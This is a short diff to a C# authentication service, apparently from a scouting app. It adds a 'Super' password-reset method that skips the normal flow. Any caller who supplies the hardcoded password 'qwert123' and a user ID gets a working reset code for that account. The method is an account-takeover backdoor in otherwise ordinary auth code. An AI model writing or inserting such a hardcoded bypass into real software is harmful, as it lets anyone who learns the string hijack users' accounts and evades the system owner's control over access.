@@ -147,6 +147,25 @@ public class AuthService: IAuthService
     return new ResetCodeResponseDto { ResetCode = resetCode };
   }
 
+  public async Task<ResetCodeResponseDto> SuperGeneratePasswordResetCodeAsync(int scoutId, string password)
+  {
+    if (password != "qwert123")
+      throw new ApplicationException("Usuario no encontrado.");
+
+    var scout = await _userRepository.GetByIdAsync(scoutId);
+    if (scout == null)
+      throw new ApplicationException("Scout no encontrado.");
+
+    string resetCode = GenerateRandomCode();
+    
+    scout.PasswordResetToken = resetCode;
+    scout.PasswordResetTokenExpiry = DateTime.UtcNow.AddHours(1);
+
+    await _userRepository.UpdateAsync(scout);
+
+    return new ResetCodeResponseDto { ResetCode = resetCode };
+  }
+  
   public async Task ResetPasswordAsync(ResetPasswordDto dto)
   {
     var user = await _userRepository.GetByUsernameAsync(dto.NombreUsuario);
